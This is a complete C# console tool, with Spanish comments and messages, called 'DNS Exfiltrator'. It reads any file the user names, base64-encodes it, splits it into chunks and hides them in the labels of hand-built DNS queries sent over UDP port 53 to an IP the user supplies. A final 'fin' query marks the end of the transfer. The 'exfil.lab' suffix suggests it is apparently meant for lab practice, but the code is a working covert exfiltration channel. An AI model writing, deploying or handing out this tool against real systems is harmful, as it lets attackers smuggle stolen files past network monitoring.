using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

class Program
{
    const int SERVER_PORT = 53;
    const int CHUNK_SIZE = 45;
    const string DOMAIN_SUFFIX = "exfil.lab";

    static void Main(string[] args)
    {
        Console.Title = "🛰️ DNS Exfiltrator";

        PrintBanner();

        // Validar argumentos
        if (args.Length != 2)
        {
            ShowHelp();
            return;
        }

        string serverIp = args[0];
        string filePath = args[1];

        if (!IPAddress.TryParse(serverIp, out IPAddress parsedIp))
        {
            Error("La IP ingresada no es válida.");
            return;
        }

        if (!File.Exists(filePath))
        {
            Error($"El archivo '{filePath}' no existe.");
            return;
        }

        // Leer y codificar el archivo
        byte[] fileData = File.ReadAllBytes(filePath);
        string base64 = Convert.ToBase64String(fileData);

        Info($"Archivo codificado: {base64.Length} bytes en base64");

        // Preparar socket UDP
        UdpClient client = new UdpClient();
        IPEndPoint server = new IPEndPoint(parsedIp, SERVER_PORT);

        // Dividir y enviar en chunks
        int index = 0;
        for (int i = 0; i < base64.Length; i += CHUNK_SIZE)
        {
            string chunk = base64.Substring(i, Math.Min(CHUNK_SIZE, base64.Length - i));
            string qname = $"{chunk}.{index++}.{DOMAIN_SUFFIX}";

            byte[] dnsPacket = BuildDnsQuery(qname);
            client.Send(dnsPacket, dnsPacket.Length, server);

            Success($"[+] Chunk enviado: {qname}");
        }

        byte[] fin = BuildDnsQuery($"fin.{DOMAIN_SUFFIX}");
        client.Send(fin, fin.Length, server);

        Success("[✓] Exfiltración completada");
        client.Close();
    }

    // Construye un paquete DNS básico
    static byte[] BuildDnsQuery(string domain)
    {
        using (MemoryStream ms = new MemoryStream())
        using (BinaryWriter bw = new BinaryWriter(ms))
        {
            bw.Write((ushort)0x1234);  // ID
            bw.Write((ushort)0x0100);  // Flags
            bw.Write((ushort)1);       // QDCOUNT
            bw.Write((ushort)0);       // ANCOUNT
            bw.Write((ushort)0);       // NSCOUNT
            bw.Write((ushort)0);       // ARCOUNT

            string[] labels = domain.Split('.');
            foreach (string label in labels)
            {
                bw.Write((byte)label.Length);
                bw.Write(Encoding.ASCII.GetBytes(label));
            }

            bw.Write((byte)0);       // Fin del QNAME
            bw.Write((ushort)1);     // QTYPE A
            bw.Write((ushort)1);     // QCLASS IN

            return ms.ToArray();
        }
    }


    static void ShowHelp()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\nUso:");
        Console.ResetColor();
        Console.WriteLine("  dns_exfiltrador.exe <IP_DEL_SERVIDOR> <ARCHIVO>\n");

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("Ejemplo:");
        Console.ResetColor();
        Console.WriteLine("  dns_exfiltrador.exe 192.168.1.56 test.txt\n");
    }

    static void Info(string msg)
    {
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("[*] " + msg);
        Console.ResetColor();
    }

    static void Success(string msg)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine(msg);
        Console.ResetColor();
    }

    static void Error(string msg)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("[!] " + msg);
        Console.ResetColor();
    }

    static void PrintBanner()
    {
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine("╔════════════════════════════════════════════╗");
        Console.WriteLine("║        DNS Exfiltrator v1.0 - C#          ║");
        Console.WriteLine("╚════════════════════════════════════════════╝");
        Console.ResetColor();
    }
}
